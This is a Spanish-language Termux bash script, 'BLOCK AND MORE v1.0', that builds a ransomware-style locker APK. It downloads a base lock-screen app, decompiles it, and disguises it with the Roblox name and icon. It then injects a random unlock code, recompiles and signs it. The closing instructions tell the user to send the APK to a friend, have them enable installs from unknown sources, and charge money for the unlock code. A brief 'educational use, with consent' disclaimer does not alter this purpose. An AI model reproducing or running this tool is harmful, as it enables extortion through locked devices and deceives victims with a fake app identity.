#!/data/data/com.termux/files/usr/bin/bash

CYAN='\033[0;36m'
AMARILLO='\033[1;33m'
VERDE='\033[0;32m'
BLANCO='\033[1;37m'
ROJO='\033[0;31m'
NC='\033[0m'

clear

echo -e "${CYAN}"
echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
echo -e "${AMARILLO}        [ BLOCK AND MORE v1.0 ]${NC}\n"

# ============================================
# GENERAR CÓDIGO ALEATORIO DE 4 DÍGITOS
# ============================================
CODIGO=$(shuf -i 1000-9999 -n 1)
echo -e "${VERDE}[✔] Código de desbloqueo generado: ${AMARILLO}$CODIGO${NC}"
echo -e "${BLANCO}[!] Guarda este código para cobrarle a tu amigo.${NC}\n"

# ============================================
# LISTA DE APPS (SOLO 1 HABILITADA)
# ============================================
APPS=(
    "Roblox"
    "Free Fire"
    "TikTok"
    "Instagram"
    "Facebook"
    "WhatsApp"
    "YouTube"
    "Minecraft"
    "PUBG Mobile"
    "Clash of Clans"
    "Spotify"
    "Netflix"
)

# ============================================
# FUNCIÓN PARA MOSTRAR MENÚ
# ============================================
mostrar_menu() {
    echo -e "${BLANCO}[+] Apps disponibles (solo la opción 1 está habilitada):${NC}\n"
    echo -e "${AMARILLO}  [01]${NC} ${VERDE}ROBLOX${NC} ${BLANCO}➜${NC} ${VERDE}✔ Disponible${NC}"
    for i in "${!APPS[@]}"; do
        if [ $i -ne 0 ]; then
            num=$((i+1))
            printf "  ${ROJO}[%02d]${NC} ${BLANCO}%s${NC} ${ROJO}🔒 BLOQUEADO${NC}\n" "$num" "${APPS[$i]}"
        fi
    done
    echo -e "\n${ROJO}⚠️  Solo la opción 01 está disponible.${NC}"
    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ============================================
# MENÚ PRINCIPAL
# ============================================
while true; do
    mostrar_menu
    read -p ">> Selecciona una opción (01-${#APPS[@]}): " opcion < /dev/tty
    
    if [[ "$opcion" == "01" ]]; then
        APP_SELECCIONADA="Roblox"
        break
    else
        echo -e "${ROJO}[!] Solo la opción 01 está disponible.${NC}"
        sleep 2
        clear
    fi
done

echo -e "${VERDE}[✔] App seleccionada: ${BLANCO}$APP_SELECCIONADA${NC}\n"

# ============================================
# PREPARAR DIRECTORIOS
# ============================================
mkdir -p ~/block_phone_temp
mkdir -p ~/storage/downloads
cd ~/block_phone_temp

# ============================================
# PASO 1: DESCARGAR APK BASE
# ============================================
echo -e "${AMARILLO}[*] Descargando APK base de bloqueo...${NC}"

# URL de la APK base (debes reemplazar con tu propio enlace)
# Puedes subir la APK a Dropbox, Google Drive, o GitHub.
BASE_APK_URL="https://www.dropbox.com/s/ejemplo/block_base.apk?dl=1"

# Intenta descargar
wget -O base.apk "$BASE_APK_URL" 2>/dev/null

if [ ! -f "base.apk" ]; then
    echo -e "${ROJO}[!] Error al descargar la APK base.${NC}"
    echo -e "${AMARILLO}[!] Coloca manualmente una APK base en:${NC}"
    echo -e "${AMARILLO}    ~/block_phone_temp/base.apk${NC}"
    echo -e "${BLANCO}[*] Luego presiona Enter para continuar...${NC}"
    read
fi

# ============================================
# PASO 2: DECOMPILAR CON APKTOOL
# ============================================
echo -e "${AMARILLO}[*] Decompilando APK...${NC}"
pkg install apktool -y > /dev/null 2>&1
apktool d base.apk -o decoded > /dev/null 2>&1

if [ ! -d "decoded" ]; then
    echo -e "${ROJO}[!] Error al decompilar. Asegúrate de tener apktool instalado.${NC}"
    exit 1
fi

# ============================================
# PASO 3: PERSONALIZAR NOMBRE E ICONO
# ============================================
echo -e "${AMARILLO}[*] Personalizando APK para: ${VERDE}$APP_SELECCIONADA${NC}"

# Cambiar nombre en AndroidManifest.xml
find decoded -name "AndroidManifest.xml" -exec sed -i 's/BlockPhone/'"$APP_SELECCIONADA"'/g' {} \;
find decoded -name "AndroidManifest.xml" -exec sed -i 's/Block Phone/'"$APP_SELECCIONADA"'/g' {} \;

# Descargar icono
ICON_URL="https://img.icons8.com/color/96/000000/$APP_SELECCIONADA.png"
wget -O icon.png "$ICON_URL" 2>/dev/null

if [ ! -f "icon.png" ]; then
    ICON_URL="https://img.icons8.com/color/96/000000/android-os.png"
    wget -O icon.png "$ICON_URL" 2>/dev/null
fi

# Copiar icono a las carpetas de recursos
find decoded -type d -name "drawable*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
find decoded -type d -name "mipmap*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null

# ============================================
# PASO 4: INYECTAR EL CÓDIGO DE DESBLOQUEO
# ============================================
echo -e "${AMARILLO}[*] Inyectando código de desbloqueo: ${VERDE}$CODIGO${NC}"

# Buscar archivo strings.xml y reemplazar el código
STRING_FILE=$(find decoded -name "strings.xml" | head -1)
if [ -f "$STRING_FILE" ]; then
    # Reemplazar el código de desbloqueo en el archivo strings
    sed -i 's/CODIGO_DESBLOQUEO/'"$CODIGO"'/g' "$STRING_FILE"
    # Cambiar textos de bloqueo
    sed -i 's/HAS SIDO HACKEADO/🔒 DISPOSITIVO BLOQUEADO/g' "$STRING_FILE"
    sed -i 's/TU DISPOSITIVO ESTÁ BLOQUEADO/⚠️ CONTACTA AL PROPIETARIO ⚠️/g' "$STRING_FILE"
    sed -i 's/Ingresa el código de desbloqueo/INGRESA EL CÓDIGO DE 4 DÍGITOS/g' "$STRING_FILE"
    sed -i 's/Código incorrecto/CÓDIGO INCORRECTO/g' "$STRING_FILE"
    sed -i 's/Intenta de nuevo en/ESPERA/g' "$STRING_FILE"
else
    echo -e "${ROJO}[!] No se encontró strings.xml. El código no se inyectará.${NC}"
fi

# ============================================
# PASO 5: RECOMPILAR Y FIRMAR
# ============================================
echo -e "${AMARILLO}[*] Recompilando APK...${NC}"
apktool b decoded -o final.apk > /dev/null 2>&1

echo -e "${AMARILLO}[*] Firmando APK...${NC}"
pkg install apksigner -y > /dev/null 2>&1

# Generar clave de prueba (solo la primera vez)
if [ ! -f "debug.keystore" ]; then
    keytool -genkey -v -keystore debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android > /dev/null 2>&1
fi

# Firmar la APK
apksigner sign --keystore debug.keystore --storepass android --keypass android --out "${APP_SELECCIONADA}_block.apk" final.apk 2>/dev/null

if [ ! -f "${APP_SELECCIONADA}_block.apk" ]; then
    echo -e "${ROJO}[!] Error al firmar. Usando APK sin firmar.${NC}"
    cp final.apk "${APP_SELECCIONADA}_block.apk"
fi

# ============================================
# PASO 6: MOVER A DESCARGA Y LIMPIAR
# ============================================
mv "${APP_SELECCIONADA}_block.apk" ~/storage/downloads/
cd ~
rm -rf ~/block_phone_temp

# ============================================
# MENSAJE FINAL
# ============================================
clear
echo -e "${CYAN}==================================================${NC}"
echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
echo -e "${CYAN}==================================================${NC}\n"
echo -e "${BLANCO}[+] App: ${AMARILLO}$APP_SELECCIONADA${NC}"
echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${APP_SELECCIONADA}_block.apk${NC}"
echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$CODIGO${NC}"
echo -e "\n${ROJO}⚠️  INSTRUCCIONES:${NC}"
echo -e "  1. Envía el archivo a tu amigo."
echo -e "  2. Dile que instale la APK (debe permitir instalaciones de fuentes desconocidas)."
echo -e "  3. Al abrirla, verá la pantalla de bloqueo rojo."
echo -e "  4. Para desbloquear, debe ingresar el código: ${VERDE}$CODIGO${NC}"
echo -e "  5. Si se equivoca, debe esperar 1 minuto (se acumula)."
echo -e "  6. 💰 Cobra por el código antes de dárselo."
echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Usa esto solo con fines educativos y con consentimiento."
echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
